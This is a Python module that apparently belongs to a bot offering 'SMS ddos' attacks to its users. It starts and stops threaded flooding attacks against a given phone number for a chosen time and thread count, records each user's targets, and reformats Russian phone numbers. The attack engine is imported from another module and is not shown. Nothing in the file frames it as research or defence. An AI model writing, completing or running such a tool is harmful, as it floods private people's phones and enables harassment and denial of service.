from threading import Thread

from processing.start_ddos import AttackMethod
from settings.response_info import info
from sql.ddosnumberlist_table import add_number
from tools.api import messages_send

ddos_dict = dict()
ddos_threads_dict = dict()

def call_ddos_number(user_id: str, number: str, time: int, threads: int):
    # Parse the number
    pr_number = parse_number(number)
    # Add to history of ddos
    add_number(user_id, number)
    # Init key user_id with key pr_number and value is AttackMethod
    ddos_dict[user_id] = {
        pr_number: AttackMethod(name='SMS', duration=time, threads=threads, target=pr_number)}
    ddos_threads_dict[user_id] = { pr_number: Thread(target=ddos_dict[user_id][pr_number].Start)}
    ddos_threads_dict[user_id][pr_number].start()
    messages_send(user_id, info['str_ddos'].format(number, time, threads))


def stop_ddos_number(user_id: str, number: str):
    if user_id in ddos_dict:
        pr_number = parse_number(number)
        # Switch off ddos for user_id and number
        ddos_dict[user_id][pr_number].is_running = False
        del ddos_dict[user_id][pr_number]
        messages_send(user_id, info['dis_ddos'].format(number))


def process_bl(user_id, command: str, number: str):
    # todo
    pass


def send_info(user_id, command: str):
    # todo
    pass


def parse_number(number: str) -> str:
    if number.startswith('+7'):
        return number[1:]
    if number.startswith('8') and len(number) >= 11:
        return number[1:]
    else:
        return number
